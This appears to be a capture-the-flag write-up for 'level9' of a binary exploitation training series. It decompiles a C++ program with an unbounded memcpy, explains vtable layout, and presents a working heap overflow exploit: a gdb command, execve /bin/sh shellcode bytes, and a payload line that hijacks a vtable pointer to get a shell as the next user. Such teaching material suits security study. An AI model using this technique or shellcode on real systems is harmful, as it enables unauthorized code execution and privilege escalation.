<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level8](../level8/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[bonus0 →](../bonus0/solution.md)
</span>
</span>

level9
======

Decompilation
-------------

This time we seem to have some c++ code.
The program looks like this:
```cpp
#include <cstdlib>
#include <cstring>

class N
{
private:
	char	annotation[100];
	int		value;

public:
	N(int value): value(value)
	{ }

	virtual int	operator+(N &other)
	{ return value + other.value; }

	virtual int	operator-(N &other)
	{ return value - other.value; }

	void setAnnotation(char *str)
	{ memcpy(annotation, str, strlen(str)); }
};

int main(int ac, char **av)
{
	N	*a;
	N	*b;

	if (ac < 2) {
		exit(1);
	}

	a = new N(5);
	b = new N(6);

	a->setAnnotation(av[1]);

	return *b + *a;
}
```

We can see that there are two virtual methods that can be overloaded by classes inheriting N.
The way virtual methods work is that each instance of a class containing them needs to have a pointer to the vtable.
The vtable contains the pointers to the inherited or overloaded implementations.
It can contain NULL pointers, when inheriting abstract classes, in which case they cannot be instanciated.

The memory layout for instances of such classes looks like this:
| vtable | members | ... |
|:------:|:-------:|:---:|
|  0x00  |   0x04  | ... |

In our case it look like this:
| vtable | annotation | value |
|:------:|:----------:|:-----:|
|  0x00  |    0x04    |  0x68 |

The contents of the vtable look like this:
|   vtable   |
|:----------:|
| operator + |
| operator - |

Before calling return, the operator +, which corresponds to the first entry of the vtable, will be called.
In assembly the call looks like this:
```nasm
...
 804867c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]	; b
 8048680:	8b 00                	mov    eax,DWORD PTR [eax]		; b->vtable
 8048682:	8b 10                	mov    edx,DWORD PTR [eax]		; b->vtable[0]

 8048684:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]	; a
 8048688:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax	; arg_1 = a

 804868c:	8b 44 24 10          	mov    eax,DWORD PTR [esp+0x10]	; b
 8048690:	89 04 24             	mov    DWORD PTR [esp],eax		; arg_0 = b

 8048693:	ff d2                	call   edx						; b->vtable[0](b, a)
...
```

Exploitation
------------

If we manage to override the pointer to b's vtable with a pointer to some other table, we can execute shellcode.

In memory, our two objects look like this:
| a.vtable | a.annotation | a.value | overhead | b.vtable | b.annotation | b.value | overhead |
|:--------:|:------------:|:-------:|:--------:|:--------:|:------------:|:-------:|:--------:|
|   0x00   |     0x04     |   0x68  |   0x6c   |   0x70   |     0x74     |   0xd8  |   0xdc   |


The memcpy copies to annotation, which is at offset 0x04. To reach b.vtable we need to input 0x70 - 0x04 = 0x6c bytes followed by the address of our fake vtable.
We can put our fake vtable at the beginning of the annotation. Inside, we can simply point onto the memory following it, so that we can place our shellcode in the remaining space.

To find out the address of the annotation buffer, we can use gdb:
```sh
gdb -batch -ex 'b * 0x08048693' -ex 'r "AAAA"' -ex 'p *(char **)($esp + 0x14) + 0x4' ./level9
```
```c
Breakpoint 1 at 0x8048693

Breakpoint 1, 0x08048693 in main ()
$1 = 0x804a00c "AAAA"
```

We can replace the As with the address + 4 and put the address to the end of the input.
I will put the same shellcode I used in level2 and fill the remaining space with As.
```
SHELLCODE=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

./level9 $'\x10\xa0\x04\x08'"$SHELLCODE"$(printf %.0sA {1..83})$'\x0c\xa0\x04\x08'
```

```sh
whoami
```
```
bonus0
```
